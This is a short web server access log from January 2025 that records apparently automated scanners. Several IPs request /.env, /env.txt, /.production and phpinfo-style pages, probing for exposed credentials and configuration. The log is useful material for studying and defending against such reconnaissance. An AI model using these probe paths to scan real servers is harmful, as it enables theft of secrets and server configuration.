95.214.55.226 - - [16/Jan/2025:11:29:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
64.62.197.118 - - [16/Jan/2025:11:48:11 +0000] "\x16\x03\x01" 400 524 "-" "-"
159.223.205.208 - - [16/Jan/2025:12:05:21 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
78.153.140.148 - - [16/Jan/2025:12:11:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:12:11:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
176.24.192.106 - - [16/Jan/2025:12:56:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.196.220.253 - - [16/Jan/2025:13:06:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.148 - - [16/Jan/2025:13:29:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:13:29:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:30:06 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 5.1; Edition Campaign 21) Presto/2.12.388 Version/12.15"
78.153.140.224 - - [16/Jan/2025:13:30:06 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.224 - - [16/Jan/2025:13:30:08 +0000] "GET /.production HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2"
78.153.140.224 - - [16/Jan/2025:13:30:08 +0000] "GET /.env.txt HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
78.153.140.224 - - [16/Jan/2025:13:30:09 +0000] "GET /env.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; NetBSD alpha; en-US; rv:1.8.1.6) Gecko/20080115 Firefox/2.0.0.6"
78.153.140.224 - - [16/Jan/2025:13:30:09 +0000] "GET /.txt HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; (R1 1.5))"
78.153.140.224 - - [16/Jan/2025:13:30:10 +0000] "GET /env. HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)"
78.153.140.224 - - [16/Jan/2025:13:30:11 +0000] "GET /.env. HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENGBWOL; rv:11.0) like Gecko"
78.153.140.224 - - [16/Jan/2025:13:30:30 +0000] "GET /p-info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; NP07; NP07)"
78.153.140.224 - - [16/Jan/2025:13:30:40 +0000] "GET /p.php HTTP/1.1" 302 331 "-" "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
78.153.140.224 - - [16/Jan/2025:13:30:42 +0000] "GET /p_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:30:50 +0000] "GET /php.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; pl; rv:1.8.1) Gecko/20061127 Firefox/2.0 (Gentoo Linux)"
78.153.140.224 - - [16/Jan/2025:13:30:55 +0000] "GET /php_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
